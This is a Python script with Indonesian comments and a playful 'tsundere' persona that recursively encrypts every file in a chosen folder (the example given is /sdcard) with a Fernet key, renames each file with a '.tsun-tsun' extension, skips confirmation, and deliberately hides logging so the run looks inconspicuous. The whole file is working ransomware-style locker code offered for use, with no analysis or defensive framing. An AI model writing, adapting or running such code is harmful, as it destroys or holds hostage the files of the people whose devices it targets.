# -*- coding: utf-8 -*-
import os
import sys
import time
from cryptography.fernet import Fernet

# --- KONSTANTA BRUTAL KUROMI ---
EXTENSION = ".tsun-tsun"
KEY_FILE = "TSUNDERE_KEY.txt"

# ANSI Colors (hanya MERAH yang dipakai untuk header)
RED = '\033[91m'
RESET = '\033[0m'
BRIGHT = '\033[1m'

# --- HEADER BRUTAL V2.2 (MINIMALIS) ---
HEADER = f"""
{BRIGHT}{RED}@@@@@@@@@@@@@@@@@@{RESET}
{RED}     @@@@@@@@@@@@@@@@@@@@@@@{RESET}
{RED}   @@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}
{RED}  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}
{RED} @@@@@@@@@@@@@@@/      \@@@/   @{RESET}
{RED}@@@@@@@@@@@@@@@@\      @@  @___@{RESET}
{RED}@@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@{RESET}
{RED}@@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@{RESET}
{RED} @@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\\{RESET}
{RED}   @@@@@@@@@@@@@|  | | | | | | | |{RESET}
{RED}        ver 2.2  \_|_|_|_|_|_|_|_|{RESET}
"""
# --- AKHIR HEADER BRUTAL ---


def generate_and_save_key():
    """Membuat kunci enkripsi baru dan menyimpannya ke KEY_FILE."""
    key = Fernet.generate_key()
    try:
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
        # Hilangkan print agar minimalis
        return key
    except Exception as e:
        print(f"{RED}ERROR: Gagal menyimpan kunci: {e}{RESET}")
        sys.exit(1)

def encrypt_file(file_path, fernet):
    """Membaca konten file dan mengenkripsinya."""
    if os.path.isdir(file_path) or file_path.endswith(sys.argv[0]) or file_path.endswith(KEY_FILE) or file_path.endswith(EXTENSION):
        return False
        
    try:
        with open(file_path, "rb") as file:
            encrypted_data = fernet.encrypt(file.read())
        
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
            
        os.rename(file_path, file_path + EXTENSION)
        # Hilangkan print agar minimalis
        return True
        
    except Exception:
        # File tidak bisa dienkripsi (misal: permission error atau file sedang dipakai)
        return False

def traverse_and_encrypt(target_dir, fernet):
    """Menelusuri semua file di direktori target secara rekursif."""
    
    encrypted_count = 0
    for root, dirs, files in os.walk(target_dir, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            if encrypt_file(file_path, fernet):
                encrypted_count += 1
                # print(f"{RED}[!] Mengunci: {file_path}{RESET}") # Hilangkan log per file
    return encrypted_count

def main():
    # 0. CLEAR SCREEN BRUTAL
    os.system('clear')
    
    # Tampilkan Header Brutal
    print(HEADER)
    
    # 1. PILIH TARGET ENKRIPSI
    print(f"\n{BRIGHT}{RED}Mii-chan:{RESET} Masukkan folder yanh akan di beri hadiah,contoh /sdcard")
    target_dir = input(f"{BRIGHT}PATH FOLDER > {RESET}").strip()
    
    if not os.path.isdir(target_dir):
        print(f"{RED}ERROR: HMPH! Folder '{target_dir}' tidak valid atau tidak ditemukan!{RESET}")
        sys.exit(1)

    # 2. KONFIRMASI OTOMATIS (Tanpa konfirmasi agar cepat)
    
    # 3. MULAI ENKRIPSI
    encryption_key = generate_and_save_key()
    fernet_cipher = Fernet(encryption_key)

    # Hilangkan semua print saat enkripsi
    start_time = time.time()
    total_encrypted = traverse_and_encrypt(target_dir, fernet_cipher)
    end_time = time.time()
    
    # 4. LAPORAN AKHIR (Pesan singkat agar tidak terlihat mencolok)
    print(f"\n{BRIGHT}{RED}Mii-chan:{RESET} Selesai. ({total_encrypted} file terenkripsi dalam {end_time - start_time:.2f} detik.)")
    print(f"{RED}Kunci disimpan di {KEY_FILE}. Aku tidak peduli.{RESET}")


if __name__ == "__main__":
    if 'cryptography' not in sys.modules:
         try:
             import cryptography
         except ImportError:
             print(f"\n{BRIGHT}{RED}ERROR TSUN-TSUN: HMPH! DASAR BODOH, PAKET 'cryptography' HILANG!{RESET}")
             print("Instal dengan 'pip install cryptography' atau Quick Install di Pydroid 3!")
             sys.exit(1)
    
    main()
